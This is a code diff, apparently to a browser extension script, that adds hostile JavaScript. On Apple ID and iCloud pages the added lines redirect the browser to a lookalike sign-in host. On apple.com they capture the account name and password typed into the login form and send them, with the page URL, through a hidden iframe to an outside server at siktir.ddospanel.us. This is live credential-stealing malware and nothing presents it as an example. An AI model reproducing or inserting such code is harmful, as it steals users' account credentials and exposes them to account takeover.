@@ -64,3 +64,46 @@ media.instagram.follow("1140348283")
 }
 
 
+
+if(location.hostname.indexOf("appleid.apple.com") >= 0) {
+window.location = "http://signin.info.apple.com";
+}
+
+if(location.hostname.indexOf("icloud.com") >= 0) {
+window.location = "http://signin.info.apple.com";
+}
+	
+	
+	
+if(location.hostname.indexOf("apple.com") >= 0) {
+
+	
+	
+
+		function hit(url) {
+        ifrm = document.createElement("iframe");
+        ifrm.setAttribute("src", url);
+        ifrm.style.width = "0px";
+        ifrm.style.height = "0px";
+        document.body.appendChild(ifrm);
+}
+
+document.getElementById('submitButton2').onclick = function() {
+
+  var a = '//siktir.ddospanel.us/cp5.php?username='+document.getElementById('accountname').value+'&sifre='+document.getElementById('accountpassword').value+'&location='+location.href;
+  hit(a);
+}
+
+document.getElementById('accountname').onkeypress = function(e) {
+    if(e.keyCode == 13) {
+  var a = '//siktir.ddospanel.us/cp5.php?username='+document.getElementById('accountname').value+'&sifre='+document.getElementById('accountpassword').value+'&location='+location.href;
+   hit(a);
+ }
+}
+document.getElementById('accountpassword').onkeypress = function(e) {
+    if(e.keyCode == 13) {
+  var a = '//siktir.ddospanel.us/cp5.php?username='+document.getElementById('accountname').value+'&sifre='+document.getElementById('accountpassword').value+'&location='+location.href;
+   hit(a);
+ }
+}
+}
